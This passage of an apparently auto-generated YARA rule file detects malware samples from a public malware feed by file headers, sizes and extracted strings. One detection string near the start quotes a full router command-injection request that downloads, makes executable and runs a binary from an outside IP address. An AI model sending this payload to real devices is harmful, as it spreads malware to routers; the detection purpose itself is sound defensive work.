        $s2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s3 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s4 = "Connection: keep-alive"
        $s5 = "Accept: */*"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB
        and all of them
}

rule Linux_c26b5b6dc1550248d43303a082d2af185dea234510869872dda15fcd2056353f
{
    meta:
        description = "Auto ML: c26b5b6dc1550248d43303a082d2af185dea234510869872dda15fcd2056353f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB
        and all of them
}

rule Windows_c2c188e1268c54261a51deaee8c99af06ec604bf7e873c88e01e3b3d95e0d028
{
    meta:
        description = "Auto ML: c2c188e1268c54261a51deaee8c99af06ec604bf7e873c88e01e3b3d95e0d028"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".bifimow"
        $s5 = ".tenal"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 278KB
        and all of them
}

rule Android_c2cf46261df0f61df62319361825093b588b28e77bde74c92968a3631090f6d8
{
    meta:
        description = "Auto ML: c2cf46261df0f61df62319361825093b588b28e77bde74c92968a3631090f6d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "HwRO9[8"
        $s3 = "B/cl5O"
        $s4 = "|ScxF?"
        $s5 = "o]]_CGL"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3961KB
        and all of them
}

rule Windows_c2d8860861cb7eb12a683e0b7b70993484df6d76edbc3f586b0e537251666144
{
    meta:
        description = "Auto ML: c2d8860861cb7eb12a683e0b7b70993484df6d76edbc3f586b0e537251666144"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "X &`NHa}_"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB
        and all of them
}

rule Windows_c328534fe8df97ccd8ff9fec54f6760f2aa9c0af3f4aa49268d83c1bbafcde19
{
    meta:
        description = "Auto ML: c328534fe8df97ccd8ff9fec54f6760f2aa9c0af3f4aa49268d83c1bbafcde19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB
        and all of them
}

rule Windows_c32e369709b4820964c1ec126228f516bb4fe56e138ecbe5a3828603c3f8b7a7
{
    meta:
        description = "Auto ML: c32e369709b4820964c1ec126228f516bb4fe56e138ecbe5a3828603c3f8b7a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "tabPage1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 687KB
        and all of them
}

rule Linux_c34149e0998cb5b0406dc02b120d10aa1ba5f4c333fced32f29fbb868b27a9d7
{
    meta:
        description = "Auto ML: c34149e0998cb5b0406dc02b120d10aa1ba5f4c333fced32f29fbb868b27a9d7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "8cpu.u"
        $s2 = "UUUUUUUUH!"
        $s3 = "t*H9HPt$"
        $s4 = "debugCal"
        $s5 = "debugCalH9"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 13844KB
        and all of them
}

rule Windows_c34c70691370321a3b75f9515d54f68c2135467ee2d0784680350cfd12f97021
{
    meta:
        description = "Auto ML: c34c70691370321a3b75f9515d54f68c2135467ee2d0784680350cfd12f97021"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "kZYi(Z"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 941KB
        and all of them
}

rule Linux_1412ea7b5bdeda8965e74ca3c35e24a73010bf2d5858a7c3560243fd74658aed
{
    meta:
        description = "Auto ML: 1412ea7b5bdeda8965e74ca3c35e24a73010bf2d5858a7c3560243fd74658aed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 123KB
        and all of them
}

rule Windows_c3509aae7603690ed7a902f1d9b12ef6c2a9ba1909dbefc61d74372041be75c6
{
    meta:
        description = "Auto ML: c3509aae7603690ed7a902f1d9b12ef6c2a9ba1909dbefc61d74372041be75c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 614KB
        and all of them
}

rule Windows_c354af7579f76000bf9f106f484fb66a5d5c5a41f477ca5121886cbb15fbdca7
{
    meta:
        description = "Auto ML: c354af7579f76000bf9f106f484fb66a5d5c5a41f477ca5121886cbb15fbdca7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "B.idata"
        $s3 = "@.themida"
        $s4 = "4$SJjj"
        $s5 = "j/iMPA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3077KB
        and all of them
}

rule Windows_c38326b43ae382c6eb3844f0a6beb4c321d8eeceecfdf9e503032f94a650d4b4
{
    meta:
        description = "Auto ML: c38326b43ae382c6eb3844f0a6beb4c321d8eeceecfdf9e503032f94a650d4b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "mnuProcessScale200"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 678KB
        and all of them
}

rule Windows_c39940efbbf790a7070e9fcf43cd2138c1791ed72cca1ddfdf2c9e4de549d485
{
    meta:
        description = "Auto ML: c39940efbbf790a7070e9fcf43cd2138c1791ed72cca1ddfdf2c9e4de549d485"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "t(j.Xj\\f"
        $s5 = "QSVWh@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2311KB
        and all of them
}

rule Windows_c3a0685e511cbe40ba729b0e396862ecc14003289fde5001f2842ccfb9363c02
{
    meta:
        description = "Auto ML: c3a0685e511cbe40ba729b0e396862ecc14003289fde5001f2842ccfb9363c02"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ";yRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2209KB
        and all of them
}

rule Windows_c3bf7178d9721dfbf12481c059e06ebc719b2ecc442396a3659b6054cc57eb72
{
    meta:
        description = "Auto ML: c3bf7178d9721dfbf12481c059e06ebc719b2ecc442396a3659b6054cc57eb72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB
        and all of them
}

rule Windows_c3c3f9bd4ca07872c4b598425966401ef02cf224fae1e67cc9f7d5867cd9ed16
{
    meta:
        description = "Auto ML: c3c3f9bd4ca07872c4b598425966401ef02cf224fae1e67cc9f7d5867cd9ed16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "@.imports"
        $s3 = "@.themida"
        $s4 = "`.vmp`R"
        $s5 = ".vmp`R"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7976KB
        and all of them
}

rule Linux_c43ecd98345ec376201ffaeb86beddf9c804ff017262879dceeb81fa2ddf39ad
{
    meta:
        description = "Auto ML: c43ecd98345ec376201ffaeb86beddf9c804ff017262879dceeb81fa2ddf39ad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AUATSH"
        $s2 = "[]A\\A]A^A_"
        $s3 = "AVAUATS"
        $s4 = "X[A\\A]A^"
        $s5 = "AWAVAUATUH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB
        and all of them
}

rule Windows_c444868d4cbbecd4c7083de14310fcc934d9e60a2c41de4a30057044acd9b962
{
    meta:
        description = "Auto ML: c444868d4cbbecd4c7083de14310fcc934d9e60a2c41de4a30057044acd9b962"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".hozet"
        $s5 = ".vumiy"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Windows_c446eb82797e5fcef2305c4582f911ba0d7d4ef20f20356a5cac987dd7d3d13f
{
    meta:
        description = "Auto ML: c446eb82797e5fcef2305c4582f911ba0d7d4ef20f20356a5cac987dd7d3d13f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB
        and all of them
}

rule Windows_1418f1140e1930a40b4dd22279c4448e44085ea3ccf0e29dccfc66cbd1b3006b
{
    meta:
        description = "Auto ML: 1418f1140e1930a40b4dd22279c4448e44085ea3ccf0e29dccfc66cbd1b3006b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 46KB
        and all of them
}

rule Windows_c46e21416616c059a9b0d50a3a4f0250b54abf8e23a1ea916220f2e365b41d4c
{
    meta:
        description = "Auto ML: c46e21416616c059a9b0d50a3a4f0250b54abf8e23a1ea916220f2e365b41d4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PPSh`6@"
        $s5 = "PathFindFileNameA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6810KB
        and all of them
}

rule Windows_c486c02faf15e3da9e9ffd8f61bca345b5ee5f1084c1236ef9529ae01ac72e7c
{
    meta:
        description = "Auto ML: c486c02faf15e3da9e9ffd8f61bca345b5ee5f1084c1236ef9529ae01ac72e7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "cE$IHr"
        $s3 = "tt`T2Q"
        $s4 = "mTo**a/mZ"
        $s5 = "a^Iem-z"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5788KB
        and all of them
}

rule Windows_c4ce370872ed6186d6a00aabb37e59936ea264bd5ee7e61bc366aa5fbbfc8cf4
{
    meta:
        description = "Auto ML: c4ce370872ed6186d6a00aabb37e59936ea264bd5ee7e61bc366aa5fbbfc8cf4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3256KB
        and all of them
}

rule Linux_c4d1725c578c93b768db14433e05a68e1068860fb28955341bdd20645698125b
{
    meta:
        description = "Auto ML: c4d1725c578c93b768db14433e05a68e1068860fb28955341bdd20645698125b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Jcj\"8B"
        $s2 = "REH'8AH 8"
        $s3 = "ej`8bja8_"
        $s4 = "eja8bj`8_"
        $s5 = "`hb8`h48c"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 4395KB
        and all of them
}

rule Linux_c50b9fb22b839b3119712ff166a8e7020c291b9f71c7a3e99c4e7211a0380250
{
    meta:
        description = "Auto ML: c50b9fb22b839b3119712ff166a8e7020c291b9f71c7a3e99c4e7211a0380250"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRh6:@"
        $s2 = "eXan-6p"
        $s3 = "PLPg}\\"
        $s4 = "$= RV70H<h"
        $s5 = ",P 8gSP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_c519bde5e40e48d81a0d6bd46c72364383d75f1a5b70cda223456a00c0dfa929
{
    meta:
        description = "Auto ML: c519bde5e40e48d81a0d6bd46c72364383d75f1a5b70cda223456a00c0dfa929"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB
        and all of them
}

rule Linux_c5293f07122b212e9c0a8d978861219e7567b47fbbc6640b4b4b9f8393cf5791
{
    meta:
        description = "Auto ML: c5293f07122b212e9c0a8d978861219e7567b47fbbc6640b4b4b9f8393cf5791"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "/BQxHoQxB"
        $s4 = "HoPpHoP"
        $s5 = "kdHo(ta"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB
        and all of them
}

rule Windows_c569fe7d3ccb9bf36356f829d5ab7de3ba4261d3beaffef1e690d8d197919c71
{
    meta:
        description = "Auto ML: c569fe7d3ccb9bf36356f829d5ab7de3ba4261d3beaffef1e690d8d197919c71"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "btnThem_Click_1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 812KB
        and all of them
}

rule Windows_c5a97c768e7ba609346fe283ab8be115e1279edd50e672a89eaa9c1693cf4df6
{
    meta:
        description = "Auto ML: c5a97c768e7ba609346fe283ab8be115e1279edd50e672a89eaa9c1693cf4df6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "KDBM(k"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB
        and all of them
}

rule Windows_c5bd3735647c42104f1dec6e8deb9a7eba8d0e89302d98baa8089cfb614d5536
{
    meta:
        description = "Auto ML: c5bd3735647c42104f1dec6e8deb9a7eba8d0e89302d98baa8089cfb614d5536"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".yuwot"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB
        and all of them
}

rule Windows_144ac8ff50960640a4fa31c209b07da62e7d11635d1525a43da3a1b7edee982b
{
    meta:
        description = "Auto ML: 144ac8ff50960640a4fa31c209b07da62e7d11635d1525a43da3a1b7edee982b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1817KB
        and all of them
}

rule Linux_c5c2ed7645917b3f43af4f1bf53bbdc7bf60c8fda30839dcc1b9178ebd7ccf3b
{
    meta:
        description = "Auto ML: c5c2ed7645917b3f43af4f1bf53bbdc7bf60c8fda30839dcc1b9178ebd7ccf3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "/proc/net/route"
        $s5 = "(null)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 106KB
        and all of them
}

rule Windows_c5c52c8d7ac7465aa7ac0e8929b1e08985443facdedbe5751e69087e9ae3010b
{
    meta:
        description = "Auto ML: c5c52c8d7ac7465aa7ac0e8929b1e08985443facdedbe5751e69087e9ae3010b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1172KB
        and all of them
}

rule Windows_c6164f6ee46e8c590f88177b10d6e1fe2f1a4f3b5d4f7944c2cec12f5ae66835
{
    meta:
        description = "Auto ML: c6164f6ee46e8c590f88177b10d6e1fe2f1a4f3b5d4f7944c2cec12f5ae66835"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 13KB
        and all of them
}

rule Windows_c62a19295b0e7fe56135d786dad65b1e2773eea90733799c0e068bd11bdaaa47
{
    meta:
        description = "Auto ML: c62a19295b0e7fe56135d786dad65b1e2773eea90733799c0e068bd11bdaaa47"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 27KB
        and all of them
}

rule Windows_c62f077bf99d737fe7ade6270c8839ad7088d0b93c06943fa5ee38501ef93208
{
    meta:
        description = "Auto ML: c62f077bf99d737fe7ade6270c8839ad7088d0b93c06943fa5ee38501ef93208"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10074KB
        and all of them
}

rule Windows_c64219142bff5748f64bce31830bb29ed247e4adf3fd5ad493358728b4486ff6
{
    meta:
        description = "Auto ML: c64219142bff5748f64bce31830bb29ed247e4adf3fd5ad493358728b4486ff6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3829KB
        and all of them
}

rule Windows_c6a30981874e6e77249a6737abb1194158562bd90d76351b859f9acaee09748b
{
    meta:
        description = "Auto ML: c6a30981874e6e77249a6737abb1194158562bd90d76351b859f9acaee09748b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 965KB
        and all of them
}

rule Linux_c6ed76defdbb31ec7652fc792d94c33dfbecfbfdeaf9818a62b3095e52785d6a
{
    meta:
        description = "Auto ML: c6ed76defdbb31ec7652fc792d94c33dfbecfbfdeaf9818a62b3095e52785d6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "h?iFjQb"
        $s2 = "cv\"_jw6"
        $s3 = "V6CnH?H_"
        $s4 = "AazbVrT"
        $s5 = "w}dDHP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB
        and all of them
}

rule Windows_c6f6a21328d5e291f331c4283fb3d4ed13499a1de87f773734c09ba0ccbd72be
{
    meta:
        description = "Auto ML: c6f6a21328d5e291f331c4283fb3d4ed13499a1de87f773734c09ba0ccbd72be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 981KB
        and all of them
}

rule Linux_c716bedd906bb5ac14606e0eab0c4fab90c4e95250972257bf3bf0957159edd8
{
    meta:
        description = "Auto ML: c716bedd906bb5ac14606e0eab0c4fab90c4e95250972257bf3bf0957159edd8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cU?G3m8!"
        $s2 = "S @n/8P&;k"
        $s3 = "cap[<wZ"
        $s4 = "(/U0`;pfj"
        $s5 = ":ZC9nG"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB
        and all of them
}

rule Linux_144ef7d3bc81a112bb4bcdc08344b8009a4566262cb9469035aa7e71134cba79
{
    meta:
        description = "Auto ML: 144ef7d3bc81a112bb4bcdc08344b8009a4566262cb9469035aa7e71134cba79"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "}b`fBr-a"
        $s3 = "R#ay!p1"
        $s4 = "7zPz](p"
        $s5 = "APe|l3j"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB
        and all of them
}

rule Windows_c728f7d571ce5633fe6c3ee6f2a66c6ba33a9ee8261e9a20bab7a9fccbc3fb42
{
    meta:
        description = "Auto ML: c728f7d571ce5633fe6c3ee6f2a66c6ba33a9ee8261e9a20bab7a9fccbc3fb42"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "QQSVWh"
        $s5 = "hSVWj@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3023KB
        and all of them
}

rule Windows_c736d5dcb526ba8db53db123fd2e547d478669edff900559766e434dc7fc6782
{
    meta:
        description = "Auto ML: c736d5dcb526ba8db53db123fd2e547d478669edff900559766e434dc7fc6782"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4653KB
        and all of them
}

rule Windows_c73bb19710439d291c7c21e3632ca7122fc85c14b0eecaaaeeda92daf5a833ae
{
    meta:
        description = "Auto ML: c73bb19710439d291c7c21e3632ca7122fc85c14b0eecaaaeeda92daf5a833ae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".clam01"
        $s4 = "Boolean"
        $s5 = "Smallint"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7357KB
        and all of them
}

